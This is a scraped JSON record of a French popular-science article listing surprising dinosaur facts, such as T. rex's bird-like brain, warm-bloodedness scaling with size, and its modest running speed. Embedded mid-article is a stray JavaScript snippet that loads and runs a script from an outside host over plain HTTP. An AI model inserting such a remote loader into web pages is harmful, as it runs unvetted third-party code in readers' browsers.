{"title": "Top 10 des infos insolites sur les dinosaures", "newspaper": "Futura Sciences", "author": ["Par la redaction de Futura"], "date_publi": "2017-07-02", "content": "On sait finalement peu de choses sur les dinosaures. Mais ce qui est extraordinaire, c'est que le peu que nous savons est souvent errone ! Vous pensez par exemple que le T-rex est une machine a tuer perfectionnee... vous allez etre etonne. Vous voyez les dinosaures comme de gros lezards... et s'ils ressemblaient finalement plus a de gros poulets a plumes ? Decouvrez en image l'integralite du  top 10 des infos insolites sur les dinosaures Le T-rex avait une cervelle d'oiseau ! Pour en savoir plus, cliquez sur l'image.  (c)  Ohio University College of Osteopathic Medicine                       On ne sait toujours pas exactement si les  Tyrannosaurus rex , souvent denommes de facon abregee des T-rex, etaient de redoutables predateurs ou de simples charognards. Mais on est sur qu'ils devaient avoir, veritablement, des << cervelles d'oiseaux >> et pas seulement parce que les oiseaux sont les derniers  dinosaures  vivants...   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Plus ils sont gros, plus ils sont chauds !  Pour savoir s'ils avaient le sang chaud, cliquez sur l'image.  (c) Courtesy of Jon Hughes, www.pixel-shack.com                               Les dinosaures etaient-ils a << sang chaud >> ou a << sang froid >> ? Selon Jamie Gillooly et ses collegues de l'Universite de Gainesville en Floride, qui publient les resultats de leurs travaux dans  Plos Biology , tout dependait de leur taille ! Il ressort de leur etude que plus les dinosaures etaient imposants, plus leur temperature etait elevee.  Le T-rex, un predateur... lent Decouvrez la vitesse de croisiere du T-rex en  cliquant sur l'image. (c) Courtesy of Vlad Konstantinov                                Le T-rex qui, selon la legende, etait un predateur hors pair etait en fait plutot lent. Il ne courrait qu'a 30 kilometres par heure. Pas mal pour un animal de 6 tonnes mais pas non plus spectaculaire pour un soi-disant << roi de la vie animale >>.  ", "theme": "planete"}